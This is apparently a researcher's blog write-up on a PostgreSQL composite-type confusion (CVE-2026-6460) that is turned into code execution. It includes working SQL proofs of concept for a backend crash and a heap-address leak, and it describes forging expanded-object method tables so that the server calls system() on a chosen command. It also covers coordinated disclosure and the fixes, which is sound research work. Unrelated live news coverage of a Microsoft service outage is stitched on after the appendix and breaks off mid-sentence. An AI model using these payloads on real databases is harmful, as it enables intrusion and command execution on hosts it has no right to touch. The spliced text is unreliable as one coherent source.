title: Turning a 22-year-old Postgres type-confusion primitive into RCE
body_text: Part 3/6 | How I Ended Up Turning a 22-Year-Old PostgreSQL Type-Confusion Primitive into RCE (CVE-2026-6460) - Mehmet Ince @mdisec - Vulnerability Researcher | Building security products | Security Advisor | Amateur Muay Thai fighter Skip to content Posts CVE INDEX About Me X LinkedIn YouTube GitHub Part 3/6 | How I Ended Up Turning a 22-Year-Old PostgreSQL Type-Confusion Primitive into RCE (CVE-2026-6460) Nov 9, 2026 If you had told me in April 2026 one question “Mehmet, can we use managed PostgreSQL for this project?” would send me into the deepest rabbit hole of my life, I would have laughed. Months later, I finally found the bottom of that rabbit hole. It was a 22-year-old zero-day in PostgreSQL core. In this blog post you will read a story of how I ended up uncovering a new class of type-confusion vulnerabilities in PostgreSQL. This is the 3rd part of blog post series named “ Systemic Risks in the Managed PostgreSQL Industry ”. For those who have missed the first two part, feel free to start from 1st and 2nd which will give you a complete context of this madness. TLDR: I gave PostgreSQL a value inside a composite type, changed the type of one of its fields, and asked it to read the value back. That type confusion led to one of the most reliable memory-corruption exploit I have seen. But I did not start by looking for a PostgreSQL core vulnerability. I was exploiting pg_clickhouse, and getting that exploit to work left me with a question about how PostgreSQL understands its own data. With an AI agent as my teacher, I worked through the internals one question at a time. Then a seemingly unrelated conversation gave me the idea that connected it all, and eventually I found myself staring at a primitive that had been there for for awhile. This is the full true story of how those pieces came together, I am sure you will enjoy this story. Beginning of August 2026 During June and July, I had been exploiting memory-corruption vulnerabilities across several PostgreSQL extensions. One of the extensions that I achieved code execution was pg_clickhouse . That case study has its own story, which I will share in the future. What matters here is what that exploit forced me to learn. pg_clickhouse translates ClickHouse values into native PostgreSQL values. A ClickHouse Array is not a PostgreSQL array, right ? So the extension had to rebuild its elements as Datum values in the format that PostgreSQL expected. A mistake in that conversion was what eventually gave me a code execution. This was my first time meeting with things like Datum , OIDs etc in the PostgreSQL universe. I learned only enough to finish the exploit, but one question remained in the back of my mind: How does PostgreSQL itself decide what a value is? And how does it process and represent it? Somewhere around late July, I finally got my head out of the extensions and just followed that question into PostgreSQL core. Disclaimer: I reported pg_clickhouse oob write + read chain to the vendor and they fixed it at Jun 23.  PostgreSQL Types 101 I started learning with a very simple query. What happens when I run the simplest query SELECT 1337? While I avoided all the black magic in Postgres internals, I kept this crash course on the basics of data types. I start with this query. SET debug_print_parse = on; SELECT 1337; SET debug_print_parse = on ; SELECT 1337 ; The database scanner looks at the query, recognises SELECT as a keyword, and 1337 as an integer token. Then it creates a parse tree for the query. Next, PostgreSQL walks the tree and transforms it into a typed query tree. {QUERY :commandType 1 :targetList ( {TARGETENTRY :expr {CONST :consttype 23 :consttypmod -1 :constlen 4 :constbyval true :constisnull false :location 7 :constvalue 4 [ 57 5 0 0 0 0 0 0 ] } } ) } { QUERY : commandType 1 :targetList ( { TARGETENTRY : expr { CONST : consttype 23 :consttypmod -1 :constlen 4 :constbyval true :constisnull false :location 7 :constvalue 4 [ 57 5 0 0 0 0 0 0 ] } } ) } Parse tree looks like above. But I just wanted to better understand things like what is the consttype 23 ? why constvalue has [ 57 5 0 0 0 0 0 0 ]  and where is my 1337 value ? At this point, I asked Opus 5 to prepare me a full deep-dive course on PostgreSQL types.  Spending a few days around there and talking with my agent, whom I named pg_expert taught me these: consttype = 23 → int4 constlen = 4 → four-byte payload constbyval = true → stored by value constisnull = false → this is not NULL consttype = 23 → int4 constlen = 4 → four - byte payload constbyval = true → stored by value constisnull = false → this is not NULL constvalue 4 [ 57 5 0 0 0 0 0 0 ] can be converted to hexadecimal, making the value easier to recognize: 57 decimal = 0x39 5 decimal = 0x05 57 decimal = 0x39 5 decimal = 0x05 On my little-endian system, the bytes were stored least-significant first: 39 05 00 00 → 0x00000539 → 1337 39 05 00 00 → 0x00000539 → 1337 So 1337 had not disappeared.  But why do we even have 8 bytes [ 57 5 0 0 0 0 0 0 ] instead of simply 4 bytes ? That was because constvalue was not declared as an int32 . It was declared as a Datum , which was 8 bytes Our value 1337::int4 value stored at the lower four bytes of that generic carrier. How can that same 8-byte Datum represent a text , an array , or custom types ? A Datum Does Not Know What It Is Chatting with my pg_expert agent taught me more. A Datum does NOT know what it represents. The eight bytes carrying 1337 did not contain a hidden label saying “I am an integer.”. PostgreSQL knew its type only because of this consttype = 23 . That number is an OID (Object IDentifiers) pointing to a row in the pg_type system catalog SELECT oid, typname, typlen, typbyval, typalign, typinput::regproc, typoutput::regproc FROM pg_type WHERE oid = 23; oid | typname | typlen | typbyval | typalign | typinput | typoutput -----+---------+--------+----------+----------+----------+----------- 23 | int4 | 4 | t | i | int4in | int4out SELECT oid, typname, typlen, typbyval, typalign, typinput::regproc, typoutput::regproc FROM pg_type WHERE oid = 23 ; oid | typname | typlen | typbyval | typalign | typinput | typoutput -----+---------+--------+----------+----------+----------+----------- 23 | int4 | 4 | t | i | int4in | int4out That means the pg_type row shows what the value means and how PostgreSQL will use it. So far, it’s brilliant and easy to understand. But what about the text type ? SELECT oid, typname, typlen, typbyval, typinput::regproc, typoutput::regproc FROM pg_type WHERE oid IN ('int4'::regtype, 'text'::regtype) // <== HERE FILTERIN THE INT4 and TEXT only ORDER BY oid; typname | typlen | typbyval | typinput | typoutput ---------+--------+----------+----------+----------- int4 | 4 | true | int4in | int4out text | -1 | false | textin | textout SELECT oid, typname, typlen, typbyval, typinput::regproc, typoutput::regproc FROM pg_type WHERE oid IN ( 'int4' ::regtype, 'text' ::regtype) // <== HERE FILTERIN THE INT4 and TEXT only ORDER BY oid; typname | typlen | typbyval | typinput | typoutput ---------+--------+----------+----------+----------- int4 | 4 | true | int4in | int4out text | - 1 | false | textin | textout For text, typlen = -1 means that the representation have a variable length. And typbyval = false means that the Datum carried a pointer. Datum ──> pointer ──> variable-length text representation Datum ── > pointer ── > variable - length text representation So the same 8-byte value stores a memory address for the text. Datum can pass the value either by value itself or by reference to it. Nice, I love the elegant abstraction Datums provides! Unknown is a type! So far everything makes sense, but I wanted to better understand the   typinput and typoutput columns too. These functions convert the value provided by the query into a native Datum or vice versa. So I ran this again. SELECT 1337, pg_typeof(1337), pg_column_size(1337); ?column? | pg_typeof | pg_column_size ----------+-----------+---------------- 1337 | integer | 4 SELECT 1337 , pg_typeof( 1337 ), pg_column_size( 1337 ); ? column ? | pg_typeof | pg_column_size ----------+-----------+---------------- 1337 | integer | 4 But then I added quotation marks to see if PostgreSQL has dynamic type casting/recognition or something: SELECT pg_typeof('1337'); pg_typeof ----------- unknown SELECT pg_typeof( '1337' ); pg_typeof ----------- unknown I was a bit confused at this moment. I initially thought unknown meant “PostgreSQL does not know the type.” So I went back to chatting with my pg_expert agent, who is teaching me everything so far. I learned that unknown is an actual PostgreSQL type with OID 705 , used for string literals whose final type hasn’t been decided yet! Again, this makes super sense because PostgreSQL deliberately assigns untyped string literals this temporary type because the same text could eventually become many different things! SELECT '1337'::int4; SELECT '1337' ::int4; For example, the query supplies the target type int4. PostgreSQL looked up the typinput function for int4 and called int4in() and when its need to be printer it use int4out() PostgreSQL converts the unknown literal ‘1337’ through int4in() into a Datum, then returns text through int4out(). Critical Thinking: Wait a Minute! The Type Chooses the Code Up until this point, typinput and typoutput looked like ordinary conversion mechanism to me. pg_type contained many different native functions for many different types. While learning more about these functions, one detail stayed with me. An output function did not inspect a Datum and discover its type. It simply trusted all the values and flags around the Datum. int4out() extracted an integer because PostgreSQL had already selected it as the output function for int4 . A different output function could interpret the same generic carrier according to completely different rules. I still remember that, at that very moment, I was actually thinking about the TOCTOU Vulnerabilities class of the web apps I have been exploiting/fixing for years and years. “What if I could somehow change the type between the moment PostgreSQL constructed a value and the moment it used that value?” If I can do this, we might be able to force PostgreSQL to process a Datum created for a completely different type as if it were the type the function expects. Having a type confusion in PostgreSQL can actually give me an opportunity to abuse all the other functions in PostgreSQL internals. So I went back to learning more about what I can use to force PostgreSQL to natively call different types’ output functions for my int4 value. It turns out that the LANGUAGE internal feature can be used for that purpose. LANGUAGE internal:  Type Confusion I Could Create on Purpose The LANGUAGE internal allows a superuser to create an SQL function pointing to native code already compiled into PostgreSQL. I created the following one. CREATE FUNCTION pg_temp.confused_textout(integer) RETURNS cstring AS 'textout' LANGUAGE internal STRICT; CREATE FUNCTION pg_temp .confused_textout( integer ) RETURNS cstring AS 'textout' LANGUAGE internal STRICT; Then I gave it the same int4 value. and my local-backend crashed! SELECT pg_temp.confused_textout(1337); server closed the connection unexpectedly This probably means the server terminated abnormally before or while processing the request. SELECT pg_temp.confused_textout( 1337 ); server closed the connection unexpectedly This probably means the server terminated abnormally before or while processing the request. I’m pretty sure the PostgreSQL experts reading this wouldn’t be surprised by this crash, but it surprised me a lot! It sent me in a completely different direction. I built a working exploit using this type-confusion feature to exploit LANGUAGE internal against security extensions deployed by managed PostgreSQL providers. That research eventually became a part of the Part 2 story. For a while, I moved on and left this type-confusion question behind. Roughly two weeks later, something completely unrelated brought me back to it. Detour: Tomatoes and SQL Injection Let me take a small detour. This Postgres article series is all about telling you my story in the end, isnt it ? I do not remember the exact date, but during one of our runs or walks, my partner Bilge (Staff Machine Learning Engineer at EDB) and I were discussing second-order SQL injection in the PostgreSQL AI extensions and the possibility of tricking AI features of these extensions to hallucinate and produce malicious SQL queries. That conversation led to chatting about prepared statements . I first learned about SQL injection around 2005, and God knows how many times I have exploited it since. Twenty years later, most libraries and frameworks still rely heavily on string escaping to generate secure SQL queries, even though RDBMSs have a beautiful feature named prepared statements. I studied them when I was a uni student, mostly to see what could still be exploited even if the target app uses prepared statements. Things like triggering excessive SQL cold parsing and stuff like that. But more importantly, for years I taught SQL Injection to thousands of my trainees with this concept: “Knowledge is knowing a tomato is a fruit; wisdom is not putting it in a fruit salad.” – Miles Kington In my version, the SQL query is the recipe and the values are the ingredients. Prepared statements let the database understand the recipe first, then receive the ingredients separately. So even a value like ' OR 1=1 -- may look evil, but it remains data and never gets the chance to rewrite the query. I had always seen this separation as a security feature. But this time, I noticed something in the middle of the convo with Bilge. Databases can finish all the parsing first and wait for me to execute it. Before execution, I can run whatever query I want. I can alter types before executing the query! Uncovering 22-Year-Old PostgreSQL Type-Confusion Primitive So the idea is simple; I could prepare a query, change something, and execute it later. But change what? PostgreSQL is not gonna let me redefine what the built-in types int4 , text , or UUID mean. I was not thinking about composite types at this point. Honestly, I barely knew what they were. I asked Claude agent pg_expert a much simpler question: Which PostgreSQL types can I create, use inside a prepared query, and then alter it before running execute ? That question led me to composite types. In PostgreSQL, a composite type represents the structure of a row. It is essentially a custom, user-defined data type that acts as a container for multiple fields, each with its own name and data type. [ 1 , 2 ] CREATE TYPE pg_temp.poc AS ( key uuid ); CREATE TYPE pg_temp .poc AS ( key uuid ); It had its own type OID, but its attributes defined the current row layout. I can change the attribute a type from UUID to another type without replacing the composite type itself. The Crash I created a one-field composite where the attribute started as UUID. Then I prepared a query, changed that attribute to bytea, and executed the prepared statement. CREATE TYPE pg_temp.poc AS (key uuid); PREPARE pc_crash AS SELECT '(01020000-0000-0000-0000-000000000000)' ::pg_temp.poc; ALTER TYPE pg_temp.poc ALTER ATTRIBUTE key TYPE bytea CASCADE; EXECUTE pc_crash; CREATE TYPE pg_temp .poc AS ( key uuid); PREPARE pc_crash AS SELECT '(01020000-0000-0000-0000-000000000000)' :: pg_temp . poc ; ALTER TYPE pg_temp . poc ALTER ATTRIBUTE key TYPE bytea CASCADE; EXECUTE pc_crash; And the result was a segfault! client backend was terminated by signal 11: Segmentation fault DETAIL: Failed process was running: EXECUTE pc_crash; client backend was terminated by signal 11 : Segmentation fault DETAIL: Failed process was running: EXECUTE pc_crash; I knew I had found exactly the kind of type confusion I had been looking for! I knew this was no longer a superuser-only LANGUAGE internal behaviour I had exploited before. I knew that I could trigger this crash as a lowest-privileged login role on any PostgreSQL instance. Probably all the Postgres-compatible offerings too (more about this later) Last but not least, I already knew that controlled UUID bytes reaching the wrong native consumer, bytea in my case, had serious exploitation potential. These two have the most reliable exploit primitive I have seen in the PostgreSQL exploits. Before diving into the Hacking PostgreSQL internals, we need to learn a few things about PostgreSQL to better understand the rest of the article! Quick Course: What is BYTEA ? bytea is PostgreSQL’s data type for storing arbitrary binary data. Internally, it uses a variable-length representation called varlena . PostgreSQL places a small header before the bytes to describe their size and storage format. Basic concepts of bytea +----------------------+------------------------+ | 4-byte header | binary payload | +----------------------+------------------------+ Basic concepts of bytea +----------------------+------------------------+ | 4 -byte header | binary payload | +----------------------+------------------------+ The header tells PostgreSQL which representation it is looking at and how large the complete value is. We do not need to understand every varlena representation. For the rest of this article, we only need to know two things Inline representation → the leading bytes can control the claimed length External expanded representation → the leading bytes can introduce an internal object pointer Inline representation → the leading bytes can control the claimed length External expanded representation → the leading bytes can introduce an internal object pointer For example, a normal inline example of the five ASCII characters hello . That 24 can be decoded as 0x24 >> 2 which is 9. So 4-byte header + 5-byte payload = 9 bytes! +----------------------+------------------+ | 24 00 00 00 | 68 65 6c 6c 6f | | 4-byte header | "hello" | +----------------------+------------------+ + ----------------------+------------------+ | 24 00 00 00 | 68 65 6c 6c 6f | | 4 - byte header | "hello" | + ----------------------+------------------+ The most important example, external representation, when header starts with 01 PostgreSQL believes the value is not stored inline at all. Instead, it treats the bytes as a reference to an expanded object somewhere in memory. +------------------+---------------------+----------------------------------+ | 01 | 02 | 88 77 66 55 44 33 22 11 | | external marker | expanded-object tag | ExpandedObjectHeader * pointer | +------------------+---------------------+----------------------------------+ + ------------------+---------------------+----------------------------------+ | 01 | 02 | 88 77 66 55 44 33 22 11 | | external marker | expanded - object tag | ExpandedObjectHeader * pointer | + ------------------+---------------------+----------------------------------+ So the following data after the header is just object reference pointer instead of the data itself. Crash and Root Cause Analysis Lets get back to where we were. The UUID I supplied contained exactly sixteen bytes, starting with 01 and 02 . While attribute a was still UUID, there was nothing special about 01 02 or the fourteen zero bytes following it. They were simply controlled UUID data. ALTER TYPE changed the current definition of attribute key from uuid to bytea , but it did not convert or rewrite the binary value already stored by the prepared query. During EXECUTE , PostgreSQL still had exactly the same bytes. When we EXECUTE the query, PostgreSQL need to return the value of our type pg_temp.poc, in order to do that, it calls the composite output function, record_out(). So record_out() looks at the  pg_temp.poc’s attribute key and says ‘That is bytea’ and selects byteaout() But the data   byteaout()  takes is our old UUID bytes that we can control. This is where the type confusion happens! byteaout() interprets 01 02 as an external expanded-object header and the following eight zero bytes as a NULL object pointer. All of these means, we can literally create any varlena representation we want by fully controlling the headers and following 12 byte! PostgreSQL thinks it needs to reach the ExpandedObjectHeader but its address is 00000000 because thats what we have written inside the UUID, therefore local-backend crash. Before byteaout() could print the value, it first needed to convert this external representation into something it can print. I learned that PostgreSQL calls this process detoasting . When we run EXECUTE pc_crash , the call path is as follows. The relevant path looked like this EXECUTE pc_crash ├─ record_out() a: bytea ├─ byteaout() fetch + detoast ├─ detoast_external_attr() 01 02 → expanded ├─ DatumGetEOHP() eohptr = NULL ├─ EOH_get_flat_size(NULL) └─ NULL->eoh_methods SIGSEGV EXECUTE pc_crash ├─ record_out() a: bytea ├─ byteaout() fetch + detoast ├─ detoast_external_attr() 01 02 → expanded ├─ DatumGetEOHP() eohptr = NULL ├─ EOH_get_flat_size( NULL ) └─ NULL -> eoh_methods SIGSEGV PostgreSQL then passed the NULL pointer to EOH_get_flat_size() . The important line inside that function was effectively: return eohptr->eoh_methods->get_flat_size(eohptr); return eohptr -> eoh_methods -> get_flat_size (eohptr); eohptr is what we influence and we choose 00000000 in our POC, which is a NULL. Therefore PostgreSQL crashed while trying to read its eoh_methods pointer because it believed it had received a valid external expanded object and followed the normal code path to process it. The exploitation idea: replacing NULL with our fake object that could make PostgreSQL follow to our own choosen methods! Hijacking control-flow via Fake ExpandedObjects contains Native Function Pointers ExpandedObjectMethods contains two native function pointers typedef struct ExpandedObjectMethods { EOM_get_flat_size_method get_flat_size; EOM_flatten_into_method flatten_into; } ExpandedObjectMethods; typedef struct ExpandedObjectMethods { EOM_get_flat_size_method get_flat_size; EOM_flatten_into_method flatten_into; } ExpandedObjectMethods ; Normal code uses those methods like this to convert an expanded object into its flat representation whenever it’s needed. EOH_get_flat_size(ExpandedObjectHeader *eohptr) { return eohptr->eoh_methods->get_flat_size(eohptr); } EOH_flatten_into(ExpandedObjectHeader *eohptr, void *result, Size allocated_size) { eohptr->eoh_methods->flatten_into(eohptr, result, allocated_size); } EOH_get_flat_size (ExpandedObjectHeader * eohptr) { return eohptr->eoh_methods-> get_flat_size (eohptr); } EOH_flatten_into (ExpandedObjectHeader * eohptr, void * result, Size allocated_size) { eohptr->eoh_methods-> flatten_into (eohptr, result, allocated_size); } This is not normally an attacker-controlled callback interface. These are trusted internal representations created by PostgreSQL. The output functions can assume the pointer, header, and methods table are not malicious. These are indirect native function calls. PostgreSQL obtains the function addresses from the object’s methods table and then calls them. That is something we can actually use to change the control-flow path. Before going further, I needed a simple model for the objects involved. I named the two fake objects according to what they represented H = fake ExpandedObjectHeader M = fake ExpandedObjectMethods table H = fake ExpandedObjectHeader M = fake ExpandedObjectMethods table So our plan is that the UUID pointed to H , H pointed to M , and M contained the native function addresses that we wanna cal. A forged expanded object redirects PostgreSQL’s methods lookup, turning the normal detoasting path into a call to system(H). Calling system($payload) The important detail is that PostgreSQL used H twice. Lets remember the actual C code eohptr->eoh_methods->get_flat_size(eohptr) │ │ │ │ │ │ │ └── argument = H │ │ └───────────── function = system@plt │ └──────────────────────────── methods table = M └─────────────────────────────────────── object = H eohptr -> eoh_methods -> get_flat_size (eohptr) │ │ │ │ │ │ │ └── argument = H │ │ └───────────── function = system@plt │ └──────────────────────────── methods table = M └─────────────────────────────────────── object = H First, it treated H as an ExpandedObjectHeader and read the eoh_methods pointer at offset +0x08 . That pointer led to M , where we had placed the address of system() . PostgreSQL then called the selected method and passed the original object pointer, H , as its first argument. In other words, H helped PostgreSQL find system() , and then the same H was handed to system() as its parameter. Fortunately, the first eight bytes of H came before the eoh_methods pointer. I could place the NULL-terminated command id>x in those bytes while keeping the address of M at offset +0x08 . Leaking Memory Addresses and defeating the ASLR with the same primitive As I have heavily talked about exploiting extensions vulnerabilities on managed-Postgres providers at Part 1 , we dont get to read /proc/self/mem due to hardening. Our exploitation plan is very clear but the challenge is we need to leak addresses of these objects. I started to chatting with my pg_expert to find more about PostgreSQL operation that could return a pointer-valued data while SQL expected an ordinary integer. The moment I prompted the agent, it went to “Oh actually we have talk about this during pg_clickhouse exploit back in July. Do you remember the ClickHouse Array is not a PostgreSQL Array ?” – my beloved teacher pg_expert agent It was a twist of fate. I had ended up exactly where the original idea had started. PostgreSQL Arrays store their element type inside their binary representation. unnest() trusts that internal type when deciding how to extract each element. Normally, everything agrees: SELECT x FROM unnest(ARRAY['hello']::text[]) AS item(x); SELECT x FROM unnest( ARRAY ['hello']:: text []) AS item(x); The array says its element is text , so unnest() returns a pointer-valued text Datum and SQL processes it as text. But what if the array internally says text , while the surrounding SQL contract says bigint ? Because text is passed by reference, unnest() returns a Datum containing the memory address of the text value! But the surrounding SQL expression expects a by-value bigint , so PostgreSQL prints those same pointer bits as an integer. In other to say this, we can exploit exactly same type confusion vulnerability to alter the arrays’ text element type to bigint so that unnest() will return the memory address instead of the value! aka leaking memory address! Creating a PostgreSQL Array data structures with UUID The smallest PostgreSQL Array needs 48 bytes. A single UUID gives a 16 controlled bytes. So we can simply combine 3 UUIDs next to each other to build exactly 48 byte fully controlled data structer! Three UUID fields provide 48 controlled bytes: 24 for array metadata, 4 for the text header, 16 for the payload, and 4 filler bytes. The animation above shows how three UUIDs become one 48-byte array carrier. I prepare those bytes while all three attributes are still UUIDs. From there, I exploit the same type confusion for only the first UUID a to bigint[] ! So unnest() extracts the element as text and returns its pointer, while SQL expects a bigint and exposes that pointer as a memory address. The final +4 skips the text header and lands on my controlled payload. CREATE TYPE pg_temp.address_carrier AS ( a uuid, b uuid, c uuid ); CREATE FUNCTION pg_temp.leak_address( r pg_temp.address_carrier ) RETURNS bigint LANGUAGE plpgsql AS $$ DECLARE pointer bigint; BEGIN SELECT x INTO pointer FROM unnest(r.a) AS item(x) LIMIT 1; RETURN pointer + 4; END $$; PREPARE address_leak AS SELECT to_hex(pg_temp.leak_address( '(c0000000-0100-0000-0000-000019000000,01000000-0100-0000-5000-000011223344,55667788-99aa-bbcc-ddee-ff0000000000)'::pg_temp.address_carrier )); ALTER TYPE pg_temp.address_carrier ALTER ATTRIBUTE a TYPE bigint[] CASCADE; EXECUTE address_leak; to_hex -------------- 55f2a589ae0c (1 row) CREATE TYPE pg_temp .address_carrier AS ( a uuid, b uuid, c uuid ); CREATE FUNCTION pg_temp .leak_address( r pg_temp . address_carrier ) RETURNS bigint LANGUAGE plpgsql AS $$ DECLARE pointer bigint ; BEGIN SELECT x INTO pointer FROM unnest( r . a ) AS item(x) LIMIT 1 ; RETURN pointer + 4 ; END $$; PREPARE address_leak AS SELECT to_hex( pg_temp . leak_address ( '(c0000000-0100-0000-0000-000019000000,01000000-0100-0000-5000-000011223344,55667788-99aa-bbcc-ddee-ff0000000000)' :: pg_temp . address_carrier )); ALTER TYPE pg_temp . address_carrier ALTER ATTRIBUTE a TYPE bigint [] CASCADE; EXECUTE address_leak; to_hex -------------- 55f2a589ae0c ( 1 row ) A direct text to bigint confusion would only reinterpret the old text bytes as an integer. The array was important because it forced PostgreSQL to first produce a real pointer and then expose those same pointer bits as a bigint . POC Videos Full working exploit on PostgreSQL 18.6 CVE-2026-6460 Umbrella Fix and Variant Analysis of 21 more cases Once I have reached that point, I started thinking about different scenarios of where we can alter the attribute types before execution. All the other possible ways of keeping the old value alive. I found the same underlying mistake around RowExpr , JSON conversion caches and different places. I reported 21 cases in total. 9 November 2026 The PostgreSQL security commits landed as part of a much larger release containing 52 new CVE. 6 of those 52 CVEs are directly connected to this article. CVE-2026-6460 is the main umbrella fix for type confusion. It introduces composite attribute versioning, CVE-2026-120142 anonymous RECORD descriptors. CVE-2026-120148 backend-local anonymous-RECORD typmod CVE-2026-116329 statistics import could publish values under an obsolete type CVE-2026-116306 prevents ExecEvalFieldStore[De]Form from using a mismatched CVE-2026-120139 integer overflow in tuple-size calculation Coordinating this with managed-PostgreSQL Providers The reason why I have fallen into that rabbit hole 5 months ago was because I needed to better understand the how managed-database industry works before making a decision because at the end of the day, we all can outsource the infrastructure but we can not outsource the risk. When the vulnerability belongs to PostgreSQL core, how does the industry coordinate to protect its own customers? So I ported the my locally working exploit to almost every managed PostgreSQL platform I know and privately shared reproducible PoCs with their security teams. I haven’t seen any vendor who is not affected by this vulnerability! including those who has Postgres compatible offering. Databricks security team engineers validated all the exploits immediately. Thanks to Aaron and his team. Google escalated the AlloyDB reports to its highest priority P0. I am genuinely grateful of all the support from Google Cloud VRP team since day one! SupaBase team received the full details around mid August. Thanks to endless support from the Etienne since I first contacted him. Ubicloud members reached out to me after my part 1 article published and then they introduced me with the ClickHouse team. Both parties are also read in somewhere at end of August. AWS Aurora/RDS and Microsoft Azure PostgreSQL teams received the reports and working PoC at mid August. But what I respected the most is that some vendors brought their most senior engineering members to start implementing their own mitigation. They did not want to leave customers exposed while waiting for the upstream release cycle. So yeah my whole August was like that. Closing: Thank you PostgreSQL Communities and Core Security Team I spent 20 years of my life around security communities around the globe. But I really need to say that the support, positive approach and the respect I have seen my time at PGCONF.eu this year was quite suprized me. Have no idea PostgreSQL community at europe has such a family kind vibe. After my talk “Nobody Gets to Be Superuser (Until I Broke In)” at PGCONF.eu last month Valencia, I have received amazing support from everyone, specially the respected members of the community who are effortlessly fixing these vulnerabilities whenever someone sends an email to the securit@ address. I owe so much of where I am today to open source. I’ve spent my life learning by hacking things, understanding how they work, and making them more secure. Being able to contribute to PostgreSQL and its ecosystem in my own way means a lot to me. Seeing those contributions so warmly welcomed means even more. My talk this year was not recorded upon my request, but I receive a lot of invitation from different countries for their local PostgreSQL meetups. If you’d like to hear the whole story, I’ll be presenting the 90 minutes edition of it at the Prague PostgreSQL Meetup on Monday, 30 November. Come join me. I PROMISE IT’LL BE WORTH IT! https://cloomba.com/e/prague-postgresql-meetup-8-2026-11-30 ( If you’ve made it this far, I’d love to hear your thoughts! Feel free to leave a comment or ask me anything. ) Appendix: Dating the Primitive and the Duplicate Fiesta The mutable-row-type primitive dates to commit 077db40fa1f3 , introduced on May 5, 2004 with ALTER TABLE ... ALTER COLUMN ... TYPE . The exploitation technique I used relies on commit 1dc5ebc9077a , introduced on May 14, 2015, which added expanded-object pointers and their native method callbacks. Later than many other primitives I discovered during exploiting 20+ variants. I am not claiming that CVE-2026-6460 is exclusively “my vulnerability.” PostgreSQL treated it as an umbrella issue covering a much wider family of composite-type problems. Its commit credits many researchers whose reports may have involved overlapping discoveries, separate variants, or completely different journeys into the same systemic weakness. That is the reality of vulnerability research in the age of AI. This article only tells the story of how I reached it without any cyber enabled models back in August 2026. Where things stand with the disruptive Microsoft service outage • Coming back online: Microsoft said it has addressed the underlying issue of a massive outage that affected millions around the world as it continues to restore service. The software giant apologized for disruptions, saying the outage was caused by a technical issue and not a cybersecurity breach. • Economic ramifications: The cost of lost productivity from the outage could approach at least $7 billion , according to a think-tank estimate. • What’s been impacted: The outage, which began around noon ET on Thursday, left workers unable to access Outlook email, Teams meeting tools and other staples of modern office life . AI companies said they were facing issues as well. Banks, governments, health services, railways and courts all reported disruptions across Microsoft products . • Global disruption: Outage reports “reached 74 countries and territories in about an hour,” according to Downdetector. While some workers scrambled to find workarounds, others expressed relief in a respite from the work grind. Read more Updated Nov 13, 2026, 1:33 PM ET Published Nov 13, 2026, 1:33 PM ET Link Copied! US city governments say services are returning after outage By August Phillips US cities are beginning to report Microsoft services returning after a widespread outage that began yesterday hit governments across the country and world. Jacksonville, Florida, said that it was “seeing some services restored this morning and remain cautiously optimistic they will continue making progress.” Austin and Dallas also reported progress on their email services being restored. The sheriff’s office in Arapahoe County , Colorado, which had previously reported the outage affecting online bond payments, said the issue was resolved. Microsoft said this morning that the “underlying issue” that caused the massive outage had been addressed and that it was seeing recovery across its services. The police department of Greensboro, North Carolina, also saw its services being restored. “While it’s not the outcome we wanted, we would like to let you know that our email is working again,” the department jested. Read more Updated Nov 13, 2026, 12:33 PM ET Published Nov 13, 2026, 12:33 PM ET Link Copied! Microsoft services returning to normal after hours of disruption. Catch up on the latest By Issy Ronald The Microsoft Outlook and Teams apps are visible on a computer screen on Friday. Robert Michael/dpa/picture-alliance/AP After hours of disruption affecting millions of users worldwide, Outlook and other Microsoft services are finally returning to normal. Microsoft has apologized for the outage, which could end up costing billions in lost productivity. The company reported “encouraging recovery progress” saying that queues of emails waiting to be delivered are “significantly reduced and approaching normal levels.” Here’s what to know: What was disrupted? Any of the applications involving email or Microsoft’s Exchange Online Services were affected, the company said. That left users likely unable to access or send new emails, use Microsoft’s AI tool Copilot, or join pre-scheduled Teams meetings already in the calendar. Other services — like those that share documents, pool a company’s data or protect emails — might also have been affected. What’s the impact? The outage left millions without the work tools they use every day and could cost $7 billion in lost productivity, according to an estimate by a Michigan think tank. Patrick Anderson, Anderson Economic Group’s president, said that perhaps as many as 26 million users on Thursday and 51 million users on Friday have actually seen their operations disrupted in a way that caused an economic loss. And he said the cost will likely increase beyond this initial estimate. City governments across the US reported disruption, encouraging residents to call local offices if necessary. Some Brits experienced delays in getting their drug prescriptions and several UK police forces told the public to report crimes or issues by telephone rather than through their websites. Meanwhile, bank workers in Hong Kong had their work disrupted, government employees in Japan resorted to creating physical copies of documents and courts in the Philippines were hindered by the outage. Some railway networks experienced disruption to their customer email services and routing schedules while Australian schools, courts and government services reported disruption. What caused this? Microsoft said the outage was caused by a “technical issue” rather than any cybersecurity breach . “The incident was introduced by an issue during an earlier network capacity upgrade that surfaced following a recent network change,” the company said. CNN’s Gage Goulding, Anna Cooban, August Phillips, Hanna Ziady, Karina Tsui, Helen Regan, Kathleen Magramo and Chris Isidore contributed reporting Read more Updated Nov 13, 2026, 12:13 PM ET Published Nov 13, 2026, 12:13 PM ET Link Copied! Microsoft apologizes, says underlying cause of outage has been addressed By August Phillips A person walks by a Microsoft logo and sign at the company's headquarters in Redmond, Washington on Monday. Lindsey Wasson/AP Microsoft has addressed the “underlying issue” that caused a massive outage affecting millions across the world, the tech company said, adding that it was “seeing broad recovery and stability across our services.” “We are deeply sorry for the disruption this incident has caused our customers and partners,” Microsoft wrote on X. “We know the trust they place in our services and take that responsibility extremely seriously.” Microsoft offered some explanation of what caused the outage that began yesterday, confirming it was a “technical issue” and not a cybersecurity or AI-related concern. “The incident was introduced by an issue during an earlier network capacity upgrade that surfaced following a recent network change,” Microsoft said. The software giant said it would release a “full post-incident report” after a review. Read more Updated Nov 13, 2026, 11:30 AM ET Published Nov 13, 2026, 11:30 AM ET Link Copied! Cost of Microsoft outage could top $7 billion, according to estimate By Chris Isidore Error messages on pages for Microsoft Outlook and Microsoft Copilot on a laptop on Friday. Chris J. Ratcliffe/Bloomberg/Getty Images The cost of lost productivity from the Microsoft outage could approach $7 billion, according to an estimate by a Michigan think tank on Friday. Anderson Economic Group, which is known for cautious estimates on the costs of economic disruptions, including labor strikes and tariffs, said that many of the reported 430 million Microsoft users who have been affected likely only are dealing with annoyances, rather than true lost productivity. But Patrick Anderson, the firm’s president, said that perhaps as many as 26 million users on Thursday and 51 million users on Friday have actually seen their operations disrupted in a way that caused an economic loss. And he said the cost will likely increase beyond this initial estimate. “This is a starting point, with all the limitations on what we know. We don’t know complete scale,” he told CNN on Friday. Some companies might be able to be compensated by cybersecurity insurance policies for the costs associated with the outage – but that would only shift the cost from the Microsoft users to their insurers. In addition, Anderson estimated that Microsoft could conceivably need to refund customers about $800 million a day in subscription fees for services they pay for under contracts but could not access. While not all customers will seek refunds, those who do so are likely to push the total cost of the outage above $7 billion, Anderson said. The outage, which began around noon ET on Thursday, left workers unable to access Outlook email, Teams meeting 